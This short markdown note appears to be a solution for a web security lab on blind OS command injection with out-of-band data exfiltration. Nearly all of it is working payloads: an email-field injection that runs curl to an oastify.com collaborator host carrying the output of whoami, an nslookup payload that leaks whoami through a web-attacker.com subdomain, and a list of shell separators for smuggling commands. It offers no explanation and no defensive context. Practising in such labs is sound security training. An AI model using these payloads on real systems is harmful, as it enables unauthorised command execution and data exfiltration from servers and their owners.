---
title: "5 - Blind OS command injection with out-of-band data exfiltration"
---

# 5 - Blind OS command injection with out-of-band data exfiltration

```bash
email=test%40test.com||curl+"http://zwz8rzx8skcv9qkhk1n23ssan1tvhoec3.oastify.com?cmd=$(whoami)"||
```

```bash
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
```


- `&`
- `&&`
- `|`
- `||`
- `;`
- Newline (`0x0a` or `\n`)
- `$()`
